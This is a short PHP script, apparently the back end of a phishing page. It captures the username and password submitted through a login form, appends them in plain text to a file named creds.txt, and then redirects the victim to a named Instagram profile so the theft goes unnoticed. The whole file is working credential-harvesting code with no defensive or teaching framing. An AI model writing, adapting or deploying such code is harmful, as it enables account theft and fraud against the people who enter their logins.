<?php
if(isset($_POST['username']) && isset($_POST['password'])) {
    $file = fopen("creds.txt", "a");
    fwrite($file, "Username: ".$_POST['username']." | Password: ".$_POST['password']."\n");
    fclose($file);

    // Redirect to real profile
    header("Location: https://www.instagram.com/marsha_cute_bea/");
    exit();
}
?>
